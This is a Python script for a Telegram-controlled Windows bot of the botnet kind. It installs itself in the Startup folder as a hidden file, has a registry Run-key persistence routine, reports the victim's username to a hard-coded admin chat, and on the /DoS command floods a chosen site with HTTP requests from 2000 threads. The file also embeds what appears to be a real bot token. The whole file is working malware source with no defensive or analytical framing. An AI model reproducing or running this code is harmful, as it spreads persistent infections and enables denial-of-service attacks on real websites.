import telebot, os, time
from telebot import types
from ctypes import *
from ctypes.wintypes import *
import shutil
import threading
import socket 
import sys,random

#from telebot import apihelper

#apihelper.proxy = {'https': 'socks5h://geek:socks@t.geekclass.ru:7777'}

def regedit():
 key_my = OpenKey(HKEY_CURRENT_USER, 
                 r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
                 0, KEY_ALL_ACCESS)
 SetValueEx(key_my, 'System', 0, REG_SZ, os.path.basename(__file__))
 # Закрыть реестр
 CloseKey(key_my)




try:
  shutil.copy2((sys.argv[0]), r'C:\\Users\\' + os.getlogin() + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
  #os.startfile('C:\\Users\\' + os.getlogin() + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\' + os.path.basename(sys.argv[0]))
  os.system(r'attrib +h "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bot.py"')
except:
  print("")


token = '5013623825:AAERJ6ABD7YoUDc5UwQBnZxK6QdUrE03Md0'
adm = '666015577'
bot = telebot.TeleBot(token)

menu = types.ReplyKeyboardMarkup()
button = types.KeyboardButton('/-DoS\n⭕️')
button2 = types.KeyboardButton('/Stop\n')
button3 = types.KeyboardButton('/Check\n')
button4 = types.KeyboardButton('/Delete\n')
menu.row(button, button3)
menu.row(button4, button2)

try:
 bot.send_message(adm, 
 os.getlogin() + ' oнлайн!',
 reply_markup=menu)
except:
 time.sleep(60)
 os.startfile(sys.argv[0])


@bot.message_handler(commands=['Check'])
def check(message):
  bot.send_message(adm, os.getlogin() + ' готов к работе!')

@bot.message_handler(commands=['Delete'])
def check(message):
  os.system(r'attrib -h "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"'+os.path.basename(__file__))
  os.remove('C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\' + os.path.basename(__file__))
  #bot.send_message(adm, 'Удалён!')
  bot.send_message(adm, 'Удалён!')
  sys.exit()


@bot.message_handler(commands=['Stop'])
def Stop():
  bot.send_message(adm, 'Приложение закрыто!')
  sys.exit()


@bot.message_handler(commands=['-DoS'])
def DoS(message):
 bot.send_message(adm, 'Синтаксис команды:\n/DoS example.site')


@bot.message_handler(commands=['DoS'])
def DoS(message):
 bot.send_message(adm, 'Атака запущена!')
 user_msg = "{0}".format(message.text)
 site = user_msg.split("/DoS ")[1]
 t = [None] *1000
 a = [None] *1000
 l = [None] *1000

 F = '\033[91m'
 E = '\033[0m'
 agent = []
 agent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
 agent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
 agent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
 agent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
 data = '''
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: en-us,en;q=0.5
 Accept-Encoding: gzip,deflate
 Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
 Keep-Alive: 115
 Connection: keep-alive'''
 def dos():
  while 1:
    try:
      s = socket.socket()
      s.connect((site, 80))
      packet = str("GET / HTTP/1.1\nHost: "+site+"\n\n User-Agent: "+random.choice(agent)+"\n"+data).encode('utf-8')
      s.sendto(packet, (site, 80))  
      s.send(packet)
      print(F+time.ctime(time.time()) + ' Send paceges->'+site+E)
    except socket.error:
      print('Site down')
      exit(1)
 def dos2():
  while 1:
    dos()

 for i in range(1000):
  t[i] = threading.Thread(target=dos)
 for h in range(1000):
  l[h] = threading.Thread(target=dos2)
 for k in range(1000):
  t[k].start()
  l[k].start()



bot.polling(none_stop=True)
